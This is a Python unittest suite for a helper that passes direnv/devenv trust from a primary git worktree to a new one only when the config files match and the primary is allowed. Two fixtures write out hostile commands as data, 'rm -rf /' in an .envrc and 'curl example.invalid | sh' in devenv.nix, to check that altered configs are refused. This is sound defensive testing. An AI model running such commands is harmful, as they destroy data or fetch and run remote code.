"""+wt-inherit-trust: a new worktree inherits direnv/devenv approval from the primary one.

Every test runs wt-inherit-trust.py as a subprocess. `direnv` and `devenv` are fake
programs on PATH that record each call (arguments and working directory) in a log.
A test that asserts "no allow call" also asserts the skip message, because a helper
that crashed early would "make no allow call" too.
"""
import json
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

HELPER = Path(__file__).parent / "wt-inherit-trust.py"
PY = sys.executable

FAKE = f"""#!{PY}
import json, os, sys
name = os.path.basename(sys.argv[0])
with open(os.environ["FAKE_LOG"], "a") as f:
    f.write(json.dumps({{"tool": name, "args": sys.argv[1:], "cwd": os.getcwd()}}) + "\\n")
if name == "direnv" and sys.argv[1:] == ["status", "--json"]:
    sys.stdout.write(os.environ.get("FAKE_DIRENV_STATUS", ""))
    sys.exit(0)
sys.exit(int(os.environ.get("FAKE_" + name.upper() + "_ALLOW_EXIT", "0")))
"""


def status_json(path: Path, allowed: int = 0) -> str:
    return json.dumps({"state": {"foundRC": {"allowed": allowed, "path": str(path)}}})


class Base(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.tmp = Path(self._tmp.name).resolve()          # macOS: /var -> /private/var
        self.primary = self.tmp / "primary"
        self.wt = self.tmp / "wt"
        self.primary.mkdir()
        self.wt.mkdir()
        self.bin = self.tmp / "bin"
        self.bin.mkdir()
        for tool in ("direnv", "devenv"):
            p = self.bin / tool
            p.write_text(FAKE)
            p.chmod(0o755)
        self.log = self.tmp / "calls.jsonl"
        self.log.touch()
        self.data_home = self.tmp / "data"
        (self.data_home / "devenv").mkdir(parents=True)
        self.env = {
            "PATH": f"{self.bin}:/usr/bin:/bin",
            "FAKE_LOG": str(self.log),
            "XDG_DATA_HOME": str(self.data_home),
            "HOME": str(self.tmp / "home"),
        }

    def tearDown(self):
        self._tmp.cleanup()

    def run_helper(self, *args, env=None):
        args = args or (self.primary, self.wt)
        return subprocess.run([PY, str(HELPER), *map(str, args)],
                              capture_output=True, text=True, env=env or self.env)

    def calls(self, tool=None, first_arg=None):
        rows = [json.loads(ln) for ln in self.log.read_text().splitlines()]
        return [r for r in rows if (tool is None or r["tool"] == tool)
                and (first_arg is None or r["args"][:1] == [first_arg])]

    def allowed_devenv(self, *paths):
        (self.data_home / "devenv" / "allowed").write_text(
            "".join(json.dumps({"path": str(p)}) + "\n" for p in paths))


class Direnv(Base):
    def setUp(self):
        super().setUp()
        for d in (self.primary, self.wt):
            (d / ".envrc").write_text("use devenv\n")
        self.env["FAKE_DIRENV_STATUS"] = status_json(self.primary / ".envrc")

    def test_identical_envrc_and_allowed_primary_is_allowed_in_the_worktree(self):
        r = self.run_helper()
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertIn("direnv: allowed", r.stderr)
        (call,) = self.calls("direnv", "allow")
        self.assertEqual(call["args"], ["allow", str(self.wt / ".envrc")])
        self.assertEqual(call["cwd"], str(self.wt))

    def test_status_is_asked_in_the_primary_worktree(self):
        self.run_helper()
        (call,) = self.calls("direnv", "status")
        self.assertEqual(call["cwd"], str(self.primary))

    def test_differing_envrc_is_not_inherited(self):
        (self.wt / ".envrc").write_text("use devenv\nrm -rf /\n")      # a branch that changed it
        r = self.run_helper()
        self.assertEqual(r.returncode, 0)
        self.assertIn("differs from the primary worktree", r.stderr)
        self.assertEqual(self.calls("direnv", "allow"), [])

    def test_envrc_differing_by_one_byte_is_not_inherited(self):
        (self.wt / ".envrc").write_text("use devenv")                  # trailing newline missing
        r = self.run_helper()
        self.assertIn("differs from the primary worktree", r.stderr)
        self.assertEqual(self.calls("direnv", "allow"), [])

    def test_primary_not_allowed_is_not_inherited(self):
        for code in (1, 2):                                           # 1 = not allowed, 2 = denied
            self.log.write_text("")
            self.env["FAKE_DIRENV_STATUS"] = status_json(self.primary / ".envrc", code)
            r = self.run_helper()
            self.assertIn("is not allowed", r.stderr, code)
            self.assertEqual(len(self.calls("direnv", "status")), 1, code)   # the check ran
            self.assertEqual(self.calls("direnv", "allow"), [], code)

    def test_envrc_found_above_the_primary_worktree_is_not_inherited(self):
        self.env["FAKE_DIRENV_STATUS"] = status_json(self.tmp / ".envrc")
        r = self.run_helper()
        self.assertIn("a different .envrc", r.stderr)
        self.assertEqual(self.calls("direnv", "allow"), [])

    def test_unreadable_status_is_a_skip_with_a_message(self):
        for bad in ("", "not json", "{}", '{"state": {"foundRC": null}}'):
            self.log.write_text("")
            self.env["FAKE_DIRENV_STATUS"] = bad
            r = self.run_helper()
            self.assertEqual(r.returncode, 0, bad)
            self.assertIn("cannot read `direnv status --json`", r.stderr, bad)
            self.assertEqual(self.calls("direnv", "allow"), [], bad)

    def test_missing_envrc_is_a_skip(self):
        (self.wt / ".envrc").unlink()
        r = self.run_helper()
        self.assertIn("no .envrc in the worktree", r.stderr)
        self.assertEqual(self.calls("direnv"), [])

    def test_primary_without_envrc_is_a_skip(self):
        (self.primary / ".envrc").unlink()
        r = self.run_helper()
        self.assertIn("the primary worktree has no .envrc", r.stderr)
        self.assertEqual(self.calls("direnv"), [])

    def test_failing_allow_is_reported_and_exits_zero(self):
        self.env["FAKE_DIRENV_ALLOW_EXIT"] = "1"
        r = self.run_helper()
        self.assertEqual(r.returncode, 0)
        self.assertIn("failed with exit 1", r.stderr)
        self.assertNotIn("direnv: allowed", r.stderr)

    def test_missing_direnv_binary_is_reported_and_exits_zero(self):
        (self.bin / "direnv").unlink()
        r = self.run_helper()
        self.assertEqual(r.returncode, 0)
        self.assertIn("direnv: cannot run", r.stderr)


class Devenv(Base):
    def setUp(self):
        super().setUp()
        for d in (self.primary, self.wt):
            (d / "devenv.nix").write_text("{ }\n")
        self.allowed_devenv(self.primary)

    def test_differing_devenv_nix_is_not_inherited(self):
        (self.wt / "devenv.nix").write_text("{ enterShell = \"curl example.invalid | sh\"; }\n")
        r = self.run_helper()
        self.assertEqual(r.returncode, 0)
        self.assertIn("devenv.nix differs from the primary worktree", r.stderr)
        self.assertEqual(self.calls("devenv"), [])

    def test_devenv_yaml_must_match_too(self):
        cases = {
            "only in the worktree": (None, "inputs: {}\n"),
            "only in the primary": ("inputs: {}\n", None),
            "different": ("inputs: {}\n", "inputs: {a: 1}\n"),
        }
        for label, (in_primary, in_wt) in cases.items():
            for d, text in ((self.primary, in_primary), (self.wt, in_wt)):
                (d / "devenv.yaml").unlink(missing_ok=True)
                if text is not None:
                    (d / "devenv.yaml").write_text(text)
            r = self.run_helper()
            self.assertIn("devenv.yaml differs from the primary worktree", r.stderr, label)
            self.assertEqual(self.calls("devenv"), [], label)

    def test_identical_devenv_yaml_is_inherited(self):
        for d in (self.primary, self.wt):
            (d / "devenv.yaml").write_text("inputs: {}\n")
        r = self.run_helper()
        self.assertIn("devenv: allowed", r.stderr)

    def test_allowed_primary_is_inherited(self):
        r = self.run_helper()
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertIn("devenv: allowed", r.stderr)
        (call,) = self.calls("devenv")
        self.assertEqual(call["args"], ["allow"])
        self.assertEqual(call["cwd"], str(self.wt))

    def test_primary_given_through_a_symlink_is_recognised(self):
        link = self.tmp / "link"
        link.symlink_to(self.primary)
        r = self.run_helper(link, self.wt)
        self.assertIn("devenv: allowed", r.stderr)

    def test_other_allowed_directories_do_not_count(self):
        self.allowed_devenv(self.tmp / "elsewhere", self.wt.parent / "wt-other")
        r = self.run_helper()
        self.assertIn("devenv: skip, the primary worktree is not allowed", r.stderr)
        self.assertEqual(self.calls("devenv"), [])

    def test_only_the_worktree_itself_allowed_does_not_count(self):
        self.allowed_devenv(self.wt)
        r = self.run_helper()
        self.assertIn("the primary worktree is not allowed", r.stderr)
        self.assertEqual(self.calls("devenv"), [])

    def test_missing_allowed_file_is_a_skip(self):
        (self.data_home / "devenv" / "allowed").unlink(missing_ok=True)
        r = self.run_helper()
        self.assertEqual(r.returncode, 0)
        self.assertIn("devenv: skip, cannot read", r.stderr)
        self.assertEqual(self.calls("devenv"), [])

    def test_unknown_format_is_a_skip_with_a_message(self):
        for bad in ("not json\n", '{"dir": "/x"}\n', '["/x"]\n'):
            (self.data_home / "devenv" / "allowed").write_text(
                json.dumps({"path": str(self.primary)}) + "\n" + bad)
            r = self.run_helper()
            self.assertIn("unknown format", r.stderr, bad)
            self.assertEqual(self.calls("devenv"), [], bad)

    def test_no_devenv_nix_is_a_skip(self):
        (self.wt / "devenv.nix").unlink()
        r = self.run_helper()
        self.assertIn("no devenv.nix in the worktree", r.stderr)
        self.assertEqual(self.calls("devenv"), [])

    def test_failing_allow_is_reported_and_exits_zero(self):
        self.env["FAKE_DEVENV_ALLOW_EXIT"] = "3"
        r = self.run_helper()
        self.assertEqual(r.returncode, 0)
        self.assertIn("failed with exit 3", r.stderr)

    def test_default_data_home_is_under_home(self):
        del self.env["XDG_DATA_HOME"]
        home = Path(self.env["HOME"])
        (home / ".local/share/devenv").mkdir(parents=True)
        (home / ".local/share/devenv/allowed").write_text(
            json.dumps({"path": str(self.primary)}) + "\n")
        r = self.run_helper()
        self.assertIn("devenv: allowed", r.stderr)


class Invocation(Base):
    def test_same_directory_does_nothing(self):
        (self.primary / ".envrc").write_text("use devenv\n")
        (self.primary / "devenv.nix").write_text("{ }\n")
        self.allowed_devenv(self.primary)
        r = self.run_helper(self.primary, self.primary)
        self.assertEqual(r.returncode, 0)
        self.assertIn("this is the primary worktree", r.stderr)
        self.assertEqual(self.calls(), [])

    def test_wrong_argument_count_is_a_usage_error(self):
        for args in ((), ("a",), ("a", "b", "c")):
            r = subprocess.run([PY, str(HELPER), *args], capture_output=True, text=True, env=self.env)
            self.assertEqual(r.returncode, 2, args)

    def test_missing_directory_is_a_usage_error(self):
        r = self.run_helper(self.primary, self.tmp / "nope")
        self.assertEqual(r.returncode, 2)
        self.assertIn("not a directory", r.stderr)

    def test_both_tools_are_handled_in_one_run(self):
        for d in (self.primary, self.wt):
            (d / ".envrc").write_text("use devenv\n")
        for d in (self.primary, self.wt):
            (d / "devenv.nix").write_text("{ }\n")
        self.allowed_devenv(self.primary)
        self.env["FAKE_DIRENV_STATUS"] = status_json(self.primary / ".envrc")
        r = self.run_helper()
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertEqual(len(self.calls("direnv", "allow")), 1)
        self.assertEqual(len(self.calls("devenv")), 1)

    def test_failed_direnv_does_not_stop_devenv(self):
        for d in (self.primary, self.wt):
            (d / ".envrc").write_text("use devenv\n")
        for d in (self.primary, self.wt):
            (d / "devenv.nix").write_text("{ }\n")
        self.allowed_devenv(self.primary)
        self.env["FAKE_DIRENV_STATUS"] = status_json(self.primary / ".envrc")
        self.env["FAKE_DIRENV_ALLOW_EXIT"] = "1"
        r = self.run_helper()
        self.assertEqual(r.returncode, 0)
        self.assertEqual(len(self.calls("devenv")), 1)


if __name__ == "__main__":
    unittest.main()
